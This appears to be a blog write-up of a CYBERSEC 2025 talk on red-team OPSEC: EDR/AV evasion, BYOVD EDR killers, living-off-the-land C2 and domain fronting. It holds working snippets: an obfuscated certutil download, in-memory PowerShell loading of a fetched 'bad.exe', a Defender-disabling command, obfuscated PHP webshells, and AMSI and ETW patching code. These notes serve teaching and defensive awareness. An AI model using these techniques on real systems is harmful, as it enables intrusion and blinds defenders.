---
title: "CYBERSEC 2025 臺灣資安大會 「Operations Security (OPSEC) — 紅隊不被抓到的秘密！」 (Steven Meow)"
date: 2025-11-19
author: "CHW"
tags:
  - techtalks
description: "深入探討如何提升紅隊操作中的隱匿性，確保其行動的隱蔽性及有效性。從網路層面的 DoH、ECH 到 Domain Fronting 等網絡匿名化技術；再到 Payload 管理和 C2 Server 的選擇與配置，涵蓋了使用 Cobalt Strike 以及 Meterpreter 等商業及開源工具..."
---

CYBERSEC 2025 臺灣資安大會 「Operations Security (OPSEC) — 紅隊不被抓到的秘密！」 (Steven Meow)
===

# Table of Contents

[TOC]

# Conference Info
**Conference Title**: CYBERSEC 2025 臺灣資安大會\
**Date**: 2025.04.17\
**Location**: 臺北南港展覽二館 7F 701E

**Presentation Title**: Operations Security 紅隊不被抓到的秘密！\
**Speaker**: 游照臨 (Steven Meow) ｜ 趨勢科技 Threat Researcher\
**Description**:
>本議程將深入探討如何提升紅隊操作中的隱匿性，確保其行動的隱蔽性及有效性。從網路層面的 DoH、ECH 到 Domain Fronting 等網絡匿名化技術；再到 Payload 管理和 C2 Server 的選擇與配置，涵蓋了使用 Cobalt Strike 以及 Meterpreter 等商業及開源工具。此外，還將介紹如何利用 Injection 等手法及 API 增加操作的隱蔽性，並探討 Mimikatz、BloodHound、impacket 等工具在實戰中的應用注意事項。\
針對現代防毒和端點保護的挑戰，演講也將探討 AMSI、ETW 等技術與繞過，幫助紅隊成員在執行任務時避開安全檢查，不觸發警報。透過這場演講，參與者將能夠學習到如何在各種安全環境下保持紅隊活動的隱蔽性，同時提升紅隊演練的效果和精準度。


![5D19D689-72AF-4A3F-83F5-1CA2442FFF92](https://hackmd.io/_uploads/BkYyDPFeWx.jpg)


# Presentation Technical Content
>[!Note]
> 內容也包含自己不太懂，上網 research 的補充知識

Hacker vs. Antivirus/EDR\
![image](https://hackmd.io/_uploads/rkOSK9Olbg.png)


## Introduction

### EDR / Antivirus 偵測
#### - 惡意指令
Antivirus 不是只看檔案，還會看 Process CommandLine\
![image](https://hackmd.io/_uploads/Sk3l_vteZe.png)
> Windows Defender 跳 `Trojan:Win32/Ceprolad.A`
>> certutil.exe: [憑證管理工具](https://learn.microsoft.com/windows-server/administration/windows-commands/certutil)\
>> `-urlcache -f`: 從 URL 抓檔案存成本機檔

在 exe 下載執行前，光 command line 就足以讓 Antivirus 告警

🥚 透過字元拆解、插引號、變形可繞過 Process CommandLine 偵測
```
ce""rt""ut""il" -u"rl"c"ac"he" -f http://10.211.55.7:8000/s.exe s.exe
```

![image](https://hackmd.io/_uploads/SkqsYPFxZg.png)


#### - 偵測 EDR/AV 被關掉
查詢 Defender（Microsoft Defender Antivirus）的狀態
```
Get-MpComputerStatus | Select RealTimeProtectionEnabled
```
將 Defender 即時防護關掉
```
Set-MpPreference -DisableRealtimeMonitoring $true
```
![image](https://hackmd.io/_uploads/r1Yt6uFgWe.png)

🥚 修改大小寫繞過偵測
![image](https://hackmd.io/_uploads/Hy9pa_txWg.png)
> SYSTEM 權限下關掉 Defender = 整台機器幾乎無防護


#### - file-based detection
EDR/AV 會針對磁碟中檔案的 [hash](https://hash-file.online/)、[signature](https://en.wikipedia.org/wiki/List_of_file_signatures)、[YARA rule](https://github.com/Yara-Rules/rules) 等進行偵測

![image](https://hackmd.io/_uploads/BJlP1tteZl.png)
> Alert：`HackTool:Win32/Mimikatz!pz`\
Affected item：`file: C:\Users\Meow\Desktop\mimikatz.exe`


利用 PowerShell 把檔案載到記憶體，直接執行：
```
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.1.333:8000/bad.exe')
```
建立一個 .NET 的 System.Net.WebClient 物件，呼叫 `DownloadData()`，從 URL 把檔案以位元組陣列形式載入，並存入 $data 變數

>[!Note]
沒有寫入磁碟，只存在記憶體

```
$assem = [System.Reflection.Assembly]::Load($data)
```
>[!Important]
>**Reflective Loader**:
將 `$data` 當成一個 `.NET Assembly` 載入`Assembly.Load(byte[])` 會在當前 process 記憶體裡直接載入執行檔
> `$assem` 就是載入後的 Assembly 物件

```
$method = $assem.EntryPoint
```
取得 Assembly 的入口點方法 = C# 的 `static void Main(...)`

接著呼叫 Main 函式的參數，讓反射呼叫 EntryPoint 看起來像正常執行
>[!Note]
>`MethodInfo.Invoke(object obj, object[] parameters)` 第二個參數型別是 `object[]`，先用 ArrayList 組合，最後再 ToArray()

```
$argu = New-Object -TypeName System.Collections.ArrayList
[string[]]$strings = "exploit"
$argu.Add($strings)
```
>建立 ArrayList 物件當作參數容器，字串陣列放 "exploit"\
個陣列加到 $argu 裡 （對應 C# `static void Main(string[] args)` 的 args)

$method 是前面取得的 $assem.EntryPoint（也就是 `static void Main(...)`）
```
$method.Invoke($null, $argu.ToArray())
```
> `$null`：EntryPoint 是 static，不需要 instance\
> `$argu.ToArray()`：轉成 object[] >> 裡面只有一個元素，就是 string[]

對 .NET 來說 👀 = `Main(new string[] { "exploit" });`

![image](https://hackmd.io/_uploads/Sk1TJKYeWl.png)

>[!Tip]
>準備一個 string[] { "exploit" } 當作 Main 的 args，
再用反射 Invoke 入口點，讓記憶體中載入的 bad.exe 在目前 PowerShell process 裡執行，會等同於在 cmd 打 bad.exe exploit 一樣。

## Case Study
APT 實際案例：\
![image](https://hackmd.io/_uploads/HkPmHKFgZg.png)
![image](https://hackmd.io/_uploads/H1uSBtKlWl.png)

### IoC: Indicator of Compromise
![image](https://hackmd.io/_uploads/SyImUYtgWg.png)

### - appitob.exe
appitob.exe 是主要的 C2 payload。appitob.exe 在 APT 中主要為 C2 / 後門程式，而且不是直接連攻擊者 VPS，而是把 C2 流量藏在 Microsoft Dev Tunnels（*.devtunnels.ms）

攻擊鏈：
```
1. 利用 BYOVD + 其他工具取得穩定控制權
2. 在受害機器上執行 appitob.exe
3. appitob.exe 連到 *.devtunnels.ms 的 URL，建立一條加密通道
4. 通道另一端為攻擊者本機或 Cobalt Strike Server（透過 Dev Tunnels 轉發）
5. 後續所有指都走這條看起來是 Microsoft 的 HTTPS 流量
```
![image](https://hackmd.io/_uploads/rkkC_qtxZl.png)
>看出 C2 流量藏在 *.devtunnels.ms 這個 legit 服務裡 >> LoL C2

>[!Note]
>**DEV tunnels**:
DEV tunnels 允許開發人員透過互聯網安全地共享本機 Web 服務。這使您可以將本機開發環境與雲端服務連接起來，與同事分享正在進行的工作，或協助建立 Webhook。開發隧道適用於臨時測試和開發，不適用於生產工作負載。([Microsoft document](https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/overview))
>>可以把自己本機上的 local web service（API、測試站）暫時公開到 Internet，不用自己架公網 IP 或處理 NAT/防火牆。

在本機架一個簡單 Flask API，透過 "Forward a port" ，從 local 端連到 Microsoft 的 Dev Tunnel 服務建立持久 TCP/TLS 連線
![image](https://hackmd.io/_uploads/BJToi9YlZg.png)
> Dev Tunnel 會在雲端點掛上一個子網域 xxxx-5000.usw3.devtunnels.ms

Dev Tunnel 在 Microsoft 端開了一個 HTTPS endpoint
![image](https://hackmd.io/_uploads/r1l73qKgWg.png)

>[!Important]
攻擊思維：將 Dev Tunnels 視為 LoL C2 tunnel\
在本機上開一個 Dev Tunnel，把 C2 server 或 CS teamserver 綁在本機某個 port。透過 Dev Tunnel 拿到 https://xxxx-5000.usw3.devtunnels.ms/ URL。\
在 appitob.exe 等 implant 裡，把 C2 目標寫成這個 URL。
👉🏻 受害機器的所有 C2 流量就只會顯示為對 *.devtunnels.ms 的 HTTPS 連線，來源目標都是 Microsoft。

```
本機服務 ↔ Dev Tunnel ↔ 外部使用者
```
### - za.sys
za.sys 是 Zemana 有簽章但有漏洞的驅動程式 (Zam64.sys)，原用於 Zemana 移除工具用的核心驅動。但被利用漏洞在 kernel 權限下關掉 EDR / AV 
> Zam64.sys driver 缺陷: 未授權的 IOCTL 可以做任意記憶體讀寫、任意 process/driver 操作等
>>  BYOVD（Bring Your Own Vulnerable Driver）


![image](https://hackmd.io/_uploads/Hkir05FeWe.png)

>[!Important]
攻擊思維：以系統/管理員權限落地兩個檔 
>- za.sys 
>- userland loader（EXE），
>    - 透過 CreateService / sc start 載入 za.sys 為 kernel driver
>    - 透過 DeviceIoControl 對 za.sys 發送特製 IOCTL
>
>若 za.sys 在 kernel 中成功執行，攻擊者就可以利用它的漏洞做很多事
>- 以 kernel 權限枚舉並 Terminate EDR / AV 的 process
>- Unload / Patch 安全產品的驅動
>- 清除 userland 裡的 hook、解除關鍵保護機制
>
>⚠️ 當 EDR / AV 從 kernel 層被移除或關閉後，後續再執行 appitob.exe、beacon_x64.exe、mimikatz、橫向移動工具等，就幾乎不會被偵測


### - svc.exe 
svc.exe 也是其中一個 C2 payload，把 C2 流量藏在 Microsoft 365／SharePoint／Graph API 裡，負責對外連線、接收指令、回傳結果

svc.exe 在執行時，會頻繁連到這些 SharePoint URL
![image](https://hackmd.io/_uploads/Sk0wXstlbe.png)

一堆 SharePoint URL 不是在正常工作，而是惡意程式在用 SharePoint 當 C2 平台
![image](https://hackmd.io/_uploads/S1wvSiYlWg.png)
> 刻意將指令與結果塞進 SharePoint / Graph API 裡，讓行為看起來像正常運作，而不是連可疑 VPS

>[!Note]
>**Graph Strike**:
>GraphStrike 是一個現成的紅隊 / 研究工具，提供 Cobalt Strike 用的一套工具組（UDRL + Server + Provisioner）。讓 Beacon 的 HTTP(S) C2 利用 Microsoft Graph API 後面接 SharePoint / OneDrive 等服務來做偽造流量
>GraphStrike 的 C2 流量 pattern 透過 SharePoint URL 白名單 Bypass 偵測，而 Beacon 流量本身消失在 Microsoft 雲端裡
>
>**Graph Strike 架構**:
>![image](https://hackmd.io/_uploads/S10APjFlbg.png)\
> ([GraphStrike: Anatomy of Offensive Tool Development](https://redsiege.com/blog/2024/01/graphstrike-developer/))

GraphStrike 連線架構：
![image](https://hackmd.io/_uploads/HktldiKeWx.png)
- Beacon
表面上只是跑 GraphStrike.exe / Beacon ，內部 WinINet HTTP client 被 UDRL 重新導向：`HttpOpenRequestA/HttpSendRequestA` 等呼叫被包裝，用 Graph API 的 URL/Headers/Body 送出
- Microsoft Graph / SharePoint
充當「Task Queue + Output Storage」，每個 Beacon 皆有 `TS tasking file`(藍) 及 `Beacon output file`(藍)。將執行指令寫在 task 檔，結果寫在 output 檔
- GraphStrike Server
對每個 Beacon 開一條 thread：
    1. 等待 TS 有新的 task（HTTP GET 拉 CS Server 任務）
    2. 把任務內容 upload 成 SharePoint 某個檔案（Task Node）
    3. 等待 Beacon 把 output 寫回另一個檔案
    4. 下載 output、發回 Cobalt Strike Team Server
- Cobalt Strike Team Server
看似 Beacon 在用 HTTP profile 和 TS 交談，🥚 實際封包是：
```
Beacon → Microsoft → GraphStrike Server → Cobalt Strike Team Server
```

### - beacon_x64.exe 
beacon_x64.exe 是 Cobalt Strike 在產生 64-bit Windows EXE payload 時的預設檔名
在 Cobalt Strike GUI 裡，建好一個 HTTP/HTTPS Listener。 
```
Attacks → Packages → Windows EXE (64-bit)
```
CS 會輸出預設檔: `beacon_x64.exe`

![image](https://hackmd.io/_uploads/SkTqsiFeWg.png)


## EDR Killer – BYOVD Attack
Kernel Driver 的威力：\
![image](https://hackmd.io/_uploads/Bk2YCiYe-g.png)

### BYOVD
BYOVD 定義與歷史，攻擊者帶一個 vulnerable driver 進受害機器，藉此拿到 **kernel 權限**、關掉 EDR\
![image](https://hackmd.io/_uploads/S1lJJ2Fxbx.png)

### LoL Drivers
Living-off-the-Land Drivers：原生或合法驅動被濫用

LoL Drivers 漏洞多為安全產品本身的 driver\
![image](https://hackmd.io/_uploads/HkpYXpKg-x.png)

LoL Drivers List:
![image](https://hackmd.io/_uploads/B1ZXNTtl-g.png)

### Weaponize Project：Terminator
![image](https://hackmd.io/_uploads/Hk5HipYx-e.png)

[ZeroMemoryEx/Terminator](https://github.com/ZeroMemoryEx/Terminator/tree/master) 重現 Spyboy 的 Terminator 技術的 PoC：
利用 zam64.sys 終止所有 EDR / XDR / AV 的 process

**User mode**:\
在 Terminator 原始 PoC 會定義字串列出常見產品的 process 名稱: `g_edrList[]`\
在工具取得 device handle 會呼叫一般 Win32 API 連到如 `\\.\ZemanaAntiMalware` 的 device，並送 IOCTL 把自己加入 trusted list，帶入自己的 PID，丟給特定 IOCTL\
接著用系統 API loop 所有 PID，取得 image name，跟 `g_edrlist[]` 比對，對命中的 PID 呼叫終止 IOCTL，請驅動在 kernel 端處理。

**Kernel mode**:\
在驅動裡，對應的 IOCTL handler 會檢查呼叫方 PID 是否在 trusted list。若是，會對指定 PID 做 process 查找（類似 `PsLookupProcessByProcessId`），視 IOCTL 功能：直接終止 process，或更改 PPL 、權限，讓 user-mode 之後也能操作。


EDR's dilemma: 辛苦藍隊同胞 🔵
![image](https://hackmd.io/_uploads/BkaFa6tl-x.png)


## C2 Network Hiding – LoL C2
C2 不一定是單純一台 VPS，可以隱藏在 Tunnel、Clloud 服務，甚至日常軟體裡，形成 LoL C2（Living-off-the-Land C2）

What C2 hacker uses ?
![image](https://hackmd.io/_uploads/SJlXqR5gZg.png)\
紅隊於 C2 要能 快速輪換、很難被封鎖，若被藍隊偵測到一個 IP 或 Domain，頂多只損失其中一個節點，整體架構要能很快換掉。

C2 Server 類型分為 Tunnel-Based, Cloud Based, Legitimate Software：\
![image](https://hackmd.io/_uploads/H1Pj-1seZg.png)


### - Tunnel-Based C2
Tunnel-Based Tool 主要是為開發者設計的，可將本機或內網的一個 port，透過雲端服務暴露成一個公開 URL\
![image](https://hackmd.io/_uploads/Sy-bsAceWg.png)
> `Cloudflare Tunnel`, `ngrok`, `Pinggy`, `LocalXpose`, `PageKite`, `frp`, `chisel` 等

### - Cloud Based C2
Cloud Based C2 可將雲端直接當 C2 Server 或 Redirector。直接在 AWS EC2 / GCP / Azure VM 上跑 TS，或用 AWS Lambda / API Gateway / Cloud Functions 當 C2 前門\
藍隊 🔵：也無法直接 Block AWS EC2 / CloudFront，因為一堆正常服務也在上面。\
![image](https://hackmd.io/_uploads/Bkh22Cqx-e.png)
> - IaaS / VPS:\
> AWS EC2 / Lightsail, GCP Compute Engine, Azure VM, DigitalOcean, Vultr, Linode, Hetzner\
直接跑 CS TS、Mythic、Sliver、Covenant 等 C2 framework
>- PaaS / Serverless:\
>[web app redirector] Heroku, Render, Railway, Flyio
[function] AWS Lambda, Azure Functions, GCP Cloud Functions\
[REST API] AWS API Gateway, Azure API Management
>- CDN / Fronting / Edge:\
[Domain Fronting] CloudFront / Fastly / Akamai / Cloudflare CDN\
[Edge Node] Cloudflare Workers / AWS Lambda@Edge\
Encrypted Client Hello (ECH) + Fronting
>- Container / Orchestration:\
AWS ECS / Fargate / Kubernetes（EKS/GKE/AKS）

### - Legitimate Software as C2
只要軟體能讀寫資料、可透過網路同步，就有可能被改造為 C2 Channel\
![image](https://hackmd.io/_uploads/rJxrJJogbx.png)
> - SNS Program:\
Slack bot, Microsoft Teams bot, Discord webhook, LINE Bot, Telegram Bot API, Mastodon, Rocket.Chat
> - Storage / File / Docs:\
Google Drive, OneDrive, Dropbox, Box, Google Docs, Notion, Confluence, GitLab, Bitbucket
> - Other SaaS:\
Jira, ServiceNow, Zendesk, Pastebin, hastebin, SMTP

或是... Counter Strike 1.6\
![image](https://hackmd.io/_uploads/Sy6ezkilWe.png)
> SOC 通報 🔵: "員工在打 CS"

### 🔵 How to detect HTTPS Host
![image](https://hackmd.io/_uploads/r1nF7JoeWl.png)
> TLS Client Hello\
> Server Name: xxx.example.com

透過 SNI 可以知道連線要去的 hostname 當作防禦基準分類

正常 CDN（Content Delivery Network）：\
使用者要連 https://aaa.com， DNS 會回一個 CDN 的 IP `104.21.x.x`。瀏覽器在 TLS handshake 的 ClientHello 裡用明文 SNI 寫上 aaa.com，Edge device（FW/Proxy/IDS）就會記錄連線是往 aaa.com。TLS 建立完成後，HTTP 要求被加密，其中的 Host header (aaa.com)。CDN 看到 SNI/Host 都是 aaa.com，會依照內部設定把流量轉送到 aaa.com 的 origin server。∑ 在正常 CDN 模式下，SNI 與 HTTP Host 一致，藍隊看到的目標網域，就是實際被存取的站台。

![image](https://hackmd.io/_uploads/r1ij4JjgWe.png)
Domain Fronting:\
Domain Fronting 刻意讓 SNI 與 HTTP Host 不一致。攻擊端仍對 DNS 查 aaa.com，連到同一個 CDN IP，在 TLS ClientHello 裡把 SNI 設成 aaa.com，讓 Edge device 以為是連到白名單的正常流量，但 TLS 建立後送出的加密 HTTP 要求裡，Host header 改成 evil.com。CDN 依 Host 把流量實際轉發到 evil.com 的 origin，然而藍隊只能看到外層 SNI=aaa.com，看不到被加密的 Host，因此誤以為只是連 aaa.com，真正的 C2 或惡意服務就藏在 CDN 後面，形成 看起來是 aaa.com，實際卻是 evil.com 的隱藏通道。\
([Encrypted Client Hello (ECH)](https://blog.cloudflare.com/announcing-encrypted-client-hello/))

## Static / Dynamic Bypass
### Static Obfuscate
靜態混淆已最常見的 PHP webshell 為例：
```
<?php system($_GET["cmd"]); ?>
```
透過 [PHP 文件](https://www.php.net/docs.php)找替代寫法\
![image](https://hackmd.io/_uploads/Hk8LjysgWg.png)
> system()，可替換 `passthru`, `exec`, `shell_exec`, `popen`, `proc_open`
> > 某些 AV/WAF 可能只針對 `system + $_GET`

若 `<?php passthru($_GET[1]); ?>` 還是會被擋，再加一層字串拆解\
![image](https://hackmd.io/_uploads/r1JB6yolbe.png)
> 在 PHP 中，字串加上小括號，若內容是一個有效函式，就會被當成動態函式呼叫，透過 `.` 串接字串
>> `<?pHp $a='pass'; ($a.'thru')($_GET[9487]); ?>`

其他 Webshell 靜態混肴可參考: [HERE](https://hackmd.io/@CHW/ByenX6HRll#Webshell)

### Dynamic Obfuscate
#### 1. Command Line
當透過 cmd.exe、powershell.exe、wscript.exe 等直譯器輸入了一段可疑指令，EDR 會在執行前或執行當下，會把即將跑的 script 內容丟給 AMSI。AMSI 再把內容送給 Defender 或其他 AV 引擎分析。

- AMSI – Antimalware Scan Interface
![image](https://hackmd.io/_uploads/HyiXbeogbl.png)

cmd: `IEX (New-Object Net.WebClient).DownloadString('http://{IP}/payload.ps1')`為例：
1. PowerShell 丟給 AMSI，將腳本內容當字串或 buffer 傳下去。在 Win32 / COM API Layer 是 AMSI 的 API，提供 `AmsiInitialize`, `AmsiScanBuffer`, `AmsiScanString` 之類的函式。`AmsiScanBuffer` Win32 API 底層會轉成呼叫 COM 介面 `IAntimalware::Scan()` 定義防毒供應商的標準 Scan 函式。
2. Windows Defender 自己有一個 provider class，會實作 `IAntimalwareProvider::Scan()`，負責把收到的 buffer 交給各自防毒引擎分析，通常是 DLL / COM 物件。接著透過 IPC / RPC 等方式，去呼叫真正的 scan engine。
3. 真正的防毒引擎跑在獨立服務 `MsMpEng.exe` 裡，`MpEngine.dll` 是 Defender 的核心掃描引擎（signature / ML / heuristics）。而 MpSvc.dll 充當 RPC server，提供給外界 provider class 呼叫。

另外從 AV Provider Layer 到 `MsMpEng.exe` 用 RPC 溝通，Provider class 不會直接在 PowerShell process 裡做完整掃描，會經由 RPC，把 buffer 傳給 `MsMpEng.exe`。`MsMpEng.exe` 做完分析後，把結果透過 RPC 回傳。

>[!Note]
>Provider 註冊機制:
>系統裡可以有多個 AV Provider（防毒引擎），每個 Provider 會註冊一個 COM class，實作 `IAntimalwareProvider` / `IAntimalware::Scan`。
>Provider Class registration (綠色圓柱) 是在表示：AMSI 會去查哪一個 Provider 有註冊，再決定要把掃描請求丟給 Windows Defender 或第三方 AV

GPT 5.1: ![image](https://hackmd.io/_uploads/S1UBBejlZx.png)

- AMSI Bypass
![image](https://hackmd.io/_uploads/rylToBeogWg.png)
1. 將 RCX 設為 0，使其不進行掃描
2. 將 instruction test rcx, rcx 改成為將 Zero Flag 設為 0 的指令

>[!Tip]
>Assembly 翻譯：
>```
>if (rcx == 0) {
>    // 不做 AMSI 掃描
>} else {
>    // 做 AMSI 掃描
>}
>```

在 x64 calling convention 下，RCX 通常是第一個參數，能改變暫存器或判斷式條件，就能讓後面的掃描邏輯被整段略過
![image](https://hackmd.io/_uploads/SkNDwejeWg.png)

在 x86-64 裡，XOR RAX, RAX (48 31 C0) 把 RAX 清成 0，同時把 Zero Flag 設成 1
```
$buf = [Byte[]] (0x48, 0x31, 0xC0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)
```
> `System.Runtime.InteropServices.Marshal::Copy` 把 managed 的 byte[] 複製到任意記憶體位址，將 $buf 開頭複製 3 個 byte，到記憶體位址 $funcAddr

```
$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
```
>(前面用 VirtualProtect 建好 delegate（$ vp）)?!\
>Invoke 呼叫 VirtualProtect。先呼叫 VirtualProtect 把那段 code page 權限改成 `PAGE_EXECUTE_READWRITE`。接著 [Marshal.Copy](https://learn.microsoft.com/dotnet/api/system.runtime.interopservices.marshal.copy?view=net-9.0) 寫入 machine code，再用 VirtualProtect 把權限改回原本值（$oldProtectionBuffer 存舊 Flag）

如果把原本判斷 test rcx, rcx 這段machine code patch 成「永遠 ZF=1」的序列，那後面的 jz 分支就會永遠變條件成立、不掃描。

>[!Tip]
>Assembly 翻譯：
>```
>if (always_zero) {
>    // 不掃 AMSI
>} else {
>    // … 永遠不會到
>}
>```

頭痛的可以參考：[AMSI Bypass: Understanding and Evasion Techniques](https://youssefachtatal.medium.com/amsi-bypass-understanding-and-evasion-techniques-7fc6108b24ff)

#### 2. Behavior
EDR 不只看 cmd line，還會看實際做了什麼事，例如：
- 可疑的 API 呼叫組合（[Process Injection](https://arz101.medium.com/process-injection-14fe552c2f1d): VirtualAlloc + WriteProcessMemory + CreateRemoteThread），或大量可疑的 registry 操作、關閉防毒等
- 網路連線模式（往奇怪 Domain、異常頻率 beacon）
- 使用 kernel exploit、載入可疑 driver、操作敏感 Handle 等

API hooking, ETW, Kernel callbacks 會收集事件，再用規則或 DL 去判斷行為序列

- ETW (Event Tracing for Windows)
只要程式有註冊成 ETW Provider，所有行為，如 Process 建立、PowerShell 內容、網路連線，都可以被 ETW 紀錄
![image](https://hackmd.io/_uploads/S1Lp2xsxZg.png)

    - Controller 如 logman、perfmon、EDR agent，負責啟用停用 ETW Provider、設定 Session、收集結果。
    - Windows Kernel 的 Event Tracing Session，有多個 Session，分別記錄不同事件。每個 Session 會接收多個 Provider 的事件：Provider A/B/C：可能是 PowerShell、.NET、Kernel、Sysmon 等。這些 Provider 在程式碼裡呼叫 ETW API，把事件 push 進 Session。
    - Session 裡的事件可以被寫到 Trace Files，也可以即時送給 EDR 或SIEM。
    
EtwEventWrite 邏輯：
![image](https://hackmd.io/_uploads/B1c7ReieZg.png)
> 第 1-4 個參數放在：RCX, RDX, R8, R9\
> 會在 RSP 下方預留 32 byte sshadow space，再加上自己的 local 變數\
>回傳值放在 RAX

ETW 使用 `ntdll.dll` 裡的 EtwEventWrite
各種 user-mode Provider（例如 PowerShell、.NET Runtime）在要送 ETW 事件時，最後都會經過 EtwEventWrite 這個 API，把 event 寫入 Session。

![image](https://hackmd.io/_uploads/rJzu1-oxWg.png)


🧠：如果在自己 process 裡把 EtwEventWrite 搞壞，這個 process 送出的 ETW 事件就會寫不出去，偵測系統就少了很多 telemetry。

![image](https://hackmd.io/_uploads/rkBSe-sg-e.png)
利用 GetProcAddress 找到 `ntdll.dll!EtwEventWrite` 的位址，用 VirtualProtectEx 開權限，再用 WriteProcessMemory 把第一個 byte 改成 0xC3（RET），讓這個 process 之後所有對 EtwEventWrite 的呼叫直接 return，不再往下到 ETW session。
```
HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
LPVOID pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
```
>`GetModuleHandleA("ntdll.dll")`: 取得目前 process 裡 ntdll.dll 的模組 handle。ntdll.dll 裡面實作了 EtwEventWrite API\
>`GetProcAddress(hNtdll, "EtwEventWrite")`: 在 ntdll.dll 裡查詢名稱為 EtwEventWrite 的函式位址，回傳的會是一個 LPVOID 指標 > `pEtwEventWrite`= ETW 事件寫入入口點在記憶體中的實際位址。

```
DWORD oldProtect;
VirtualProtectEx(pi.hProcess,(LPVOID)pEtwEventWrite,1,PAGE_EXECUTE_READWRITE,&oldProtect);
```
> VirtualProtectEx(...):
> - `pi.hProcess`：目標 process 的 handle，常見是先 CreateProcess 出來的 child，或已注入的 process
> - `(LPVOID)pEtwEventWrite`：拿到的 EtwEventWrite 函式位址
> - 1：修改的長度 1 byte
> - `PAGE_EXECUTE_READWRITE`：修改權限允許執行、讀寫
> - `&oldProtect`：除存原本的權限，以便還原

```
char patch = 0xC3; // ret
WriteProcessMemory(pi.hProcess,(LPVOID)pEtwEventWrite,&patch,sizeof(char),NULL);
```
> `char patch = 0xC3;`: 建立 1 byte 的變數 patch
0xC3 代表指令 RET（return）。
>WriteProcessMemory(...):\
把 EtwEventWrite 函式開頭的第一個 byte 改成 RET

當目標 process 裡有程式呼叫 EtwEventWrite(...) 時進入函式，第一指令就是 RET，立刻 return 回去

```
VirtualProtectEx(pi.hProcess,(LPVOID)pEtwEventWrite,1,oldProtect,NULL);
```
> 將 PAGE_EXECUTE_READWRITE 改回 oldProtect。
>>避免多出 RWX 權限而被偵測

user-mode ETW bypass 頭痛的可以參考：[Bypassing ETW For Fun and Profit](https://whiteknightlabs.com/2021/12/11/bypassing-etw-for-fun-and-profit/)

#### - Kernel API Hooking
若繞過 ntdll.dll 的 hook ，還有 kernel 的 API hooking / callback，可以在系統呼叫層看所有操作\
![image](https://hackmd.io/_uploads/SkcwSWseZe.png)

EDR 不一定只在 user-mode 看 API，而是在 kernel 裡 hook SSDT / callback（`PsSetCreateProcessNotifyRoutineEx``ObRegisterCallbacks`…），也可改成系統呼叫返回路徑，讓每一次 `NtCreateProcess`, `NtWriteVirtualMemory`, `NtCreateFile` 等都先進 EDR 的檢查邏輯。在 kernel 端的 callback 還是看得到整個事件。

#### - UnHook
EDR 用 hook 偵測，可以用 direct syscall 或恢復原始 ntdll 來拆這些 hook，但這些行為容易被進階防禦當成 IOC\
([自訂跳轉函數的unhook方法](https://killer.wtf/2022/01/19/CustomJmpUnhook.html))

![image](https://hackmd.io/_uploads/ryJt8WixWg.png)
1. Direct system call 不經過被注入 hook 的 user-mode API（ `kernel32!CreateRemoteThread`），直接呼叫 `ntdll!NtCreateThreadEx` 的 syscall stub，甚至自建 stub。有機會避免 user-mode inline hook 或 IAT hook
2. 從乾淨的 ntdll 把原始 code call 回來，再把被 EDR inline 的 JMP 移除，或手動指定自訂 jump，跳過 EDR 的 handler

#### - Memory Scan
即使繞過檔案掃描，記憶體也可能會被掃\
![image](https://hackmd.io/_uploads/HyAhP-igWx.png)
就算 fileless 或加殼混淆可執行檔，只要 payload 在記憶體裡（ shellcode、 Cobalt Strike beacon、字串），記憶體掃描引擎仍然可以用  signature, entropy 或 YARA 偵測。

#### - Lazy Loading / Staged Loading
新 beacon 或 loader 啟用時，不要立刻注入惡意 API，先把前半段行為洗成正常程式\
![image](https://hackmd.io/_uploads/By4XOWigWg.png)
有些 EDR, sandbox 對於 process 剛啟動的幾秒鐘特別敏感：一啟動就 VirtualAlloc + WriteProcessMemory + CreateRemoteThread\
初始程式先只做簡單初始化、只載入常見 DLL，待條件符合再執行 download, decrypt, inject 等手法。

#### - Sleep Mask
不整 payload 一直明文躺在記憶體裡，休眠期間遮蔽自己，降低被 memory scan 抓到的機率
![image](https://hackmd.io/_uploads/ryWBKZsxWe.png)

C2 beacon 一般會在一段時間內做 injection, dump creds, 橫向，並 Sleep(mins) 等待下次任務，原因在於有些 EDR 會在 process idle, Sleep 期間做 memory scan。

#### - Process Injection
![image](https://hackmd.io/_uploads/HyckcbjgWl.png)
Process Explorer：`CreateRemoteThread`, `NtQueueApcThread`, `SetWindowsHookEx`, `RtlCreateUserThread`…

隱藏行程名稱，藏在 explorer.exe, svchost.exe 等，利用現成權限與網路通路，把檔案 IO / network 事件歸到其他 process。

#### - Kerberos OPSec
在做 Kerberoasting、S4U、Golden Ticket、Shadow Credentials 等手法時，也要顧操作痕跡：加密型別、存活時間、log pattern，避免一眼被看出來\
![image](https://hackmd.io/_uploads/r1aBi-jeZl.png)
>1. 盡量使用 AES 型的加密（`aes256_cts_hmac_sha1`），避免 RC4 老演算法
>2. 不要使用 Golden Ticket，使用Diamond, Sapphire ticket
>我問 GPT: Golden Ticket 高權限且高持久，但特徵超明顯
>3. 不要開超長存活（幾天、幾週）的 service ticket 或 TGT，

## Conclusion

![image](https://hackmd.io/_uploads/SJmj2eslbl.png)

其他 Bypass EDR/AV 技巧可參考：[Red Team - Bypass EDR/AV](https://hackmd.io/@jonafk555/HklDLZsVJg)###### tags: `CYBERSEC` `2024` `AAD` `Active Directory`

###### tags: `CYBERSEC` `2025` `red team` `offensive security`
